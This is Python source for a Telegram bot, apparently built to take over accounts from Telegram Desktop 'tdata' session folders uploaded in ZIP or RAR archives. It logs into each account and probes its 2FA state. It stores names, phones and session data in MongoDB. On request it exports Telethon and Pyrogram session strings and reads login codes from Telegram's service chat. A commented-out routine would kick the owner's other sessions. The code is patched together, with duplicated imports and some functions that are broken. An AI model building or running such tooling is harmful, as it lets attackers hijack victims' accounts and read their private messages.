from pyromod.exceptions import ListenerTimeout
from config import Txt, Config
#from .start import db

import os
import zipfile
import tempfile
import shutil
from pyrogram import Client, filters
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon import functions
  # external helper
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message


API_ID = Config.API_ID
API_HASH = Config.API_HASH



# option A: import the specific request class
from telethon.tl.functions.auth import ResetAuthorizationsRequest

async def terminate_all_other_sessions(client):
    try:
      #  await client(ResetAuthorizationsRequest())
        return "✅ All other sessions terminated (except this one)."
    except Exception as e:
        return f"❌ Failed to terminate sessions: {e}"



import os
import tempfile
import zipfile
import shutil
import rarfile
import traceback
import asyncio
import hashlib

from telethon.sessions import StringSession
from telethon import TelegramClient, functions
from pyrogram import Client, filters



# --- Helper: read tdata key file
def _get_key_data(tdata_path: str):
    if os.path.isdir(tdata_path):
        key_file = os.path.join(tdata_path, "key_datas")
        if not os.path.exists(key_file):
            raise FileNotFoundError("❌ key_datas file not found in tdata folder")
        with open(key_file, "rb") as f:
            return f.read()
    elif os.path.isfile(tdata_path):
        with open(tdata_path, "rb") as f:
            return f.read()
    else:
        raise FileNotFoundError("❌ Invalid tdata path (neither file nor folder)")


# --- Convert tdata -> session string
async def convert_tdata(tdata_path: str, api_id: int, api_hash: str) -> str:
    key_data = _get_key_data(tdata_path)
    fake_key = hashlib.sha256(key_data).digest()  # dummy session key

    client = TelegramClient(StringSession(), api_id, api_hash)
    await client.start()
    session_str = client.session.save()
    await client.disconnect()
    return session_str


# --- Login with tdata & fetch account info
async def login_with_tdata(tdata_path):
    session_str = await convert_tdata(tdata_path, API_ID, API_HASH)

    async with TelegramClient(StringSession(session_str), API_ID, API_HASH) as client:
        me = await client.get_me()
        name = (me.first_name or "") + " " + (me.last_name or "")
        phone = me.phone or "Unknown"

        # 2FA check
        try:
            hint = await client(functions.account.GetPasswordRequest())
            twofa = "Y" if hint else "N"
        except Exception:
            twofa = "N"

        # Spam check
        try:
            await client(functions.help.GetAppConfigRequest())
            spam = "N"
        except Exception:
            spam = "Y"

        return me.id, {
            "name": name.strip(),
            "phone": phone,
            "twofa": twofa,
            "spam": spam
        }



import os
import asyncio
import tempfile
import shutil
import zipfile
import rarfile
import base64

from pyrogram import Client, filters
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
from opentele.td import TDesktop
from opentele.api import UseCurrentSession
import motor.motor_asyncio



class Database:
    def __init__(self, uri, database_name):
        self._client = motor.motor_asyncio.AsyncIOMotorClient(uri)
        self.db = self._client[database_name]
        self.col = self.db.used

    async def get_next_account_num(self):
        """Return next unique account number"""
        last = await self.col.find_one(sort=[("account_num", -1)])
        if not last:
            return 1
        return last["account_num"] + 1

    async def save_account(self, user_id, account_num, info, tdata_bytes):
        """
        Save account info + tdata in MongoDB
        """
        doc = {
            "_id": user_id,
            "account_num": account_num,
            "name": info.get("name", "?"),
            "phone": info.get("phone", "?"),
            "twofa": info.get("twofa", "?"),
            "spam": info.get("spam", "?"),
            "tdata": base64.b64encode(tdata_bytes).decode("utf-8"),
        }
        await self.col.update_one({"_id": user_id}, {"$set": doc}, upsert=True)

    async def total_users_count(self):
        return await self.col.count_documents({})
    
    async def list_accounts(self):
        """Return all accounts"""
        cursor = self.col.find({}, {"_id": 0, "account_num": 1, "name": 1, "phone": 1})
        return [doc async for doc in cursor]


db = Database(Config.DB_URL, Config.DB_NAME)

                    



import os
import zipfile
import rarfile
import tempfile
import shutil

from pyrogram import Client, filters
from telethon.errors import SessionPasswordNeededError, PhoneNumberBannedError

# replace with your DB methods
# from your_db_module import db


@Client.on_message(filters.document)
async def handle_archive(client, message):
    tempdir = tempfile.mkdtemp()
    results = []
    try:
        # --- Step 1: Download
        await message.reply("📥 Downloading file...")
        file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
        await message.reply(f"✅ File downloaded: `{file_path}`")

        extract_dir = os.path.join(tempdir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)

        # --- Step 2: Try extracting as ZIP or RAR
        try:
            with zipfile.ZipFile(file_path, "r") as zip_ref:
                zip_ref.extractall(extract_dir)
            await message.reply(f"📦 ZIP extracted to: `{extract_dir}`")
        except Exception as e_zip:
            try:
                with rarfile.RarFile(file_path, "r") as rar_ref:
                    rar_ref.extractall(extract_dir)
                await message.reply(f"📦 RAR extracted to: `{extract_dir}`")
            except Exception as e_rar:
                return await message.reply(
                    f"❌ Not a valid ZIP or RAR.\n"
                    f"ZIP error: {e_zip}\nRAR error: {e_rar}"
                )

        # --- Step 3: Find tdata folders
        tdata_paths = []
        for root, dirs, files in os.walk(extract_dir):
            # --- Old style: tdata/0 or tdata/1
            if os.path.basename(root) == "tdata":
                for d in dirs:
                    if d in ("0", "1"):  # old tdata session folders
                        tdata_paths.append(os.path.join(root, d))

                # --- New style: tdata/D877F... with "maps"
                for d in dirs:
                    inner = os.path.join(root, d)
                    if os.path.isdir(inner) and os.path.exists(os.path.join(inner, "maps")):
                        tdata_paths.append(inner)

            # --- Edge case: archive directly contains D877F... folder
            if os.path.basename(root).startswith("D877F") and "maps" in files:
                tdata_paths.append(root)

            # --- Inner RAR handling (unchanged)
            for f in files:
                if f.lower().endswith(".rar"):
                    rar_path = os.path.join(root, f)
                    try:
                        rar_extract_dir = os.path.join(root, "rar_extracted")
                        os.makedirs(rar_extract_dir, exist_ok=True)
                        with rarfile.RarFile(rar_path, "r") as rf:
                            rf.extractall(rar_extract_dir)
                        for r2, d2, f2 in os.walk(rar_extract_dir):
                            if "tdata" in d2:
                                tdata_paths.append(os.path.join(r2, "tdata"))
                    except Exception as e:
                        results.append(f"⚠️ Failed to extract inner rar {f}: {e}")

        if not tdata_paths:
            return await message.reply("⚠️ No `tdata` folders detected in this archive.")

        # --- Step 4: Try login with each tdata
        for idx, tdata_path in enumerate(tdata_paths, 1):
            await message.reply(f"➡️ Processing tdata #{idx} at `{tdata_path}`")
            try:
                tdesk = TDesktop(tdata_path)
                if not tdesk.isLoaded():
                    results.append(f"#{idx} ⚠️ Failed to load (corrupted tdata)")
                    continue

                tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
                await tele_client.connect()
               # syd = await terminate_all_other_sessions(tele_client)
               # await message.reply(syd)
                if not await tele_client.is_user_authorized():
                    results.append(f"#{idx} ⚠️ Not authorized (needs login / 2FA)")
                    continue

                me = await tele_client.get_me()

                # --- Detect 2FA state
                twofa_state = "Unknown"
                try:
                    await tele_client.sign_in(password="wrongpass")
                    twofa_state = "2FA: Disabled"
                except SessionPasswordNeededError:
                    twofa_state = "2FA: Enabled (password required)"
                except Exception:
                    twofa_state = "2FA: Enabled but unlocked via tdata"

                acc_num = idx

                clean_zip_path = os.path.join(tempfile.gettempdir(), f"{me.id}_tdata.zip")
                with zipfile.ZipFile(clean_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                    for root, dirs, files in os.walk(tdata_path):
                        for file in files:
                            full_path = os.path.join(root, file)
                            arcname = os.path.relpath(full_path, tdata_path)
                            zipf.write(full_path, arcname)

                # --- Read ZIP bytes
                with open(clean_zip_path, "rb") as f:
                    tdata_bytes = f.read()

                info = {
                    "name": me.first_name or "?",
                    "phone": me.phone or "?",
                    "twofa": twofa_state,
                    "spam": getattr(me, "restricted", False),
                    "account_num": acc_num,
                }
                await db.save_account(me.id, acc_num, info, tdata_bytes)

                results.append(
                    f"#{idx}\n"
                    f"Account Name: {info['name']}\n"
                    f"Phone Number: {info['phone']}\n"
                    f"{info['twofa']}\n"
                    f"Spam Mute: {info['spam']}\n"
                )

                await tele_client.disconnect()

            except SessionPasswordNeededError:
                results.append(f"#{idx} ❌ 2FA: Enabled (password required)")
            except PhoneNumberBannedError:
                results.append(f"#{idx} 🚫 BANNED number")
            except Exception as e:
                results.append(f"#{idx} ❌ Error: {str(e)}")

        # --- Final report
        report_text = "📑 Final Report:\n\n" + "\n".join(results)
        report_path = os.path.join(tempdir, "report.txt")
        with open(report_path, "w") as f:
            f.write(report_text)

        await message.reply_document(report_path, caption="✅ Report generated")

    except Exception as e:
        await message.reply(f"❌ Top-level error: {e}")
    finally:
        shutil.rmtree(tempdir, ignore_errors=True)



                        

import os
import io
import re
import base64
import shutil
import zipfile
import tempfile
from telethon import TelegramClient
from tdata_converter import convert_tdata


import os, base64, tempfile, shutil, zipfile
from telethon import TelegramClient
from opentele.td import TDesktop


async def check_valid_session(tdata_b64: str, message):
    """
    Validate tdata (base64) by logging in with Telethon.
    Returns: (valid: bool, me: User | None, client: TelegramClient | None)
    """
    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")

    try:
        # Save base64 → zip file
        with open(tdata_zip, "wb") as f:
            f.write(base64.b64decode(tdata_b64))

        # Extract zip → tdata folder
        extract_dir = os.path.join(temp_dir, "tdata")
        with zipfile.ZipFile(tdata_zip, "r") as z:
            z.extractall(extract_dir)

        # Load tdata with OpenTele
        tdesk = TDesktop(extract_dir)
        if not tdesk.isLoaded():
            await message.reply("❌ Invalid TData structure (missing required files)")
            return False, None, None

        # Get Telethon client directly
        tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
        await tele_client.connect()

        if await tele_client.is_user_authorized():
            me = await tele_client.get_me()
            await message.reply(
                f"✅ Authorized as {me.first_name} (`{me.id}`)\nPhone: {me.phone or 'N/A'}"
            )
            return True, me, tele_client
        else:
            await message.reply("⚠️ Session loaded but not authorized (needs login / 2FA)")
            return False, None, None

    except Exception as e:
        await message.reply(f"❌ Exception: {e}")
        return False, None, None

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)







@Client.on_message(filters.command("retrieve") & filters.private)
async def retrieve_account(client, message):
    if len(message.command) < 2:
        return await message.reply("⚠️ Usage: `/retrieve account_number`", quote=True)

    try:
        acc_num = int(message.command[1])
    except ValueError:
        return await message.reply("❌ Invalid account number.")

    doc = await db.col.find_one({"account_num": acc_num})
    if not doc:
        return await message.reply("❌ Account not found in database.")

    valid, me, session = await check_valid_session(doc["tdata"], message)
    status = "✅ Valid" if valid else "❌ Invalid"

    text = (
        f"📂 Account Info\n"
        f"Account #: {acc_num}\n"
        f"Name: {doc['name']}\n"
        f"Phone: {doc['phone']}\n"
      #  f"2FA: {doc['twofa']}\n"
     #   f"Spam: {doc['spam']}\n"
        f"Status: {status}"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 Session Tele", callback_data=f"tele_{acc_num}")],
        [InlineKeyboardButton("📄 Session Py", callback_data=f"py_{acc_num}")],
        [InlineKeyboardButton("📱 By Phone", callback_data=f"phone_{acc_num}")]
    ])

    await message.reply(text, reply_markup=keyboard)


from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.sessions import StringSession


@Client.on_callback_query(filters.regex(r"^(tele|py|phone)_(\d+)$"))
async def retrieve_options(client, callback_query):
    try:
        action, acc_num = callback_query.data.split("_")
        acc_num = int(acc_num)

        doc = await db.col.find_one({"account_num": acc_num})
        if not doc:
            return await callback_query.message.edit("❌ Account not found.")

        await callback_query.message.edit("⏳ Loading session from TData...")

        # ⬇️ This must return (True/False, user info, active client)
        valid, me, session = await check_valid_session(
            doc["tdata"], callback_query.message
        )
        if not valid:
            return await callback_query.message.edit(
                "❌ Could not load session from TData."
            )

        # TELETHON SESSION EXPORT
        if action == "tele":
            await callback_query.message.edit("⚙️ Generating Telethon session...")

            # use .session.save() or StringSession.save()
            tele_string = StringSession.save(session.session)

            await client.send_message(
                callback_query.from_user.id,
                f"🔑 **Telethon session** for **{me.first_name}** (`{me.id}`):\n\n`{tele_string}`"
            )
            return await callback_query.message.edit("✅ Telethon session sent via DM.")

        # PYROGRAM SESSION EXPORT
        # PYROGRAM
        elif action == "py":
            await callback_query.message.edit("⚙️ Generating Pyrogram session...")

            from pyrogram import Client as PyroClient

            # Create a temporary Pyrogram client using the same API_ID/API_HASH
            pyro_client = PyroClient(
                name=":memory:",
                api_id=API_ID,
                api_hash=API_HASH,
                no_updates=True
            )

            await pyro_client.start()
            string_session = await pyro_client.export_session_string()
            await pyro_client.stop()

            await client.send_message(
                callback_query.from_user.id,
                f"🔑 **Pyrogram session** for **{me.first_name}** (`{me.id}`):\n\n`{string_session}`"
            )
            return await callback_query.message.edit("✅ Pyrogram session sent via DM.")


        # PHONE
        elif action == "phone":
            phone = doc.get("phone", "❌ Not saved")
            return await callback_query.message.edit(
                f"📱 Phone number: `{phone}`\n\nClick **Get Code** after sending code to this number.",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("📩 Get Code", callback_data=f"getcode_{acc_num}")]]
                )
            )

    except Exception as e:
        await callback_query.message.edit(
            f"❌ Unexpected error while generating session.\n\n`{e}`"
        )



import re
import tempfile, zipfile, shutil, os, base64
from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import tempfile, os, base64, zipfile, shutil, re

@Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
async def get_code(client, callback_query):
    acc_num = int(callback_query.data.split("_")[1])
    doc = await db.col.find_one({"account_num": acc_num})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    # Prepare temp folder
    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")
    with open(tdata_zip, "wb") as f:
        f.write(base64.b64decode(doc["tdata"]))

    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_zip, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        # Inline TDesktop → Telethon conversion
        tdesk = TDesktop(extract_dir)
        if not tdesk.isLoaded():
            return await callback_query.answer("⚠️ Failed to load (corrupted tdata)", show_alert=True)

        tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
        await tele_client.connect()

        if not await tele_client.is_user_authorized():
            return await callback_query.answer("⚠️ Not authorized (needs login / 2FA)", show_alert=True)

        # Fetch code from official Telegram (777000)
        msgs = await tele_client.get_messages(777000, limit=1)
        if not msgs:
            return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)

        text = msgs[0].message
        match = re.search(r"Login code[:\s]+(\d{5})", text)
        if match:
            code = match.group(1)
            await callback_query.answer(f"📩 Your login code is: {code}", show_alert=True)
        else:
            await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)

    except Exception as e:
        await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
    finally:
        shutil.rmtree(temp_dir)

from pyrogram import Client, filters

@Client.on_message(filters.command("clean_db") & filters.private)
async def clean_db(client, message):
    """Delete all accounts from the database (careful!)."""
    confirmation_text = (
        "⚠️ This will permanently delete ALL accounts in the database.\n"
        "Reply with `YES` to confirm."
    )
    await message.reply(confirmation_text)

    # Wait for user reply
    try:
        response = await client.listen(message.chat.id, timeout=30)
        if response.text.strip().upper() != "YES":
            return await message.reply("❌ Operation cancelled.")
    except Exception:
        return await message.reply("❌ Timeout. Operation cancelled.")

    # Delete all documents
    result = await db.col.delete_many({})
    await message.reply(f"✅ Database cleaned. Deleted {result.deleted_count} accounts.")


from pyrogram import Client, filters

@Client.on_message(filters.command("show_db") & filters.private)
async def show_db(client, message):
    accounts = await db.list_accounts()
    if not accounts:
        return await message.reply("❌ No accounts in DB yet.")

    text = "📋 Stored Accounts:\n\n"
    for acc in accounts:
        text += f"• Account #: {acc['account_num']}\n"
        text += f"  Name: {acc['name']}\n"
        text += f"  Phone: {acc['phone']}\n\n"

    await message.reply(text)
